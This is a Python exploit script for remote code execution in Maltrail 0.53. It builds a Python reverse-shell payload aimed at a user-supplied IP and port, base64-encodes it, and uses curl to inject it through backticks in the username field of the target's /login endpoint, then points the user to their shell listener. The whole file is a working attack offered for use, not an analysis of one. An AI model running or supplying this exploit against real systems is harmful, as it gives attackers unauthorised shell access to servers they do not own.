# Maltrail 0.53 Remote Code Execution
#!/bin/python3

import sys
import os
import base64

# Arguments to be passed
YOUR_IP = sys.argv[1]  # <your ip>
YOUR_PORT = sys.argv[2]  # <your port>
TARGET_URL = sys.argv[3]  # <target url>

print("\n[+]Started MailTrail version 0.53 Exploit")

# Fail-safe for arguments
if len(sys.argv) != 4:
    print("Usage: python3 mailtrail.py <your ip> <your port> <target url>")
    sys.exit(-1)


# Exploit the vulnerbility
def exploit(my_ip, my_port, target_url):
    # Defining python3 reverse shell payload
    payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
    # Encoding the payload with base64 encoding
    encoded_payload = base64.b64encode(payload.encode()).decode()
    # curl command that is to be executed on our system to exploit mailtrail
    command = f"curl '{target_url}/login' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
    # Executing it
    os.system(command)


print("\n[+]Exploiting MailTrail on {}".format(str(TARGET_URL)))
try:
    exploit(YOUR_IP, YOUR_PORT, TARGET_URL)
    print("\n[+] Successfully Exploited")
    print("\n[+] Check your Reverse Shell Listener")
except:
    print("\n[!] An Error has occured. Try again!")
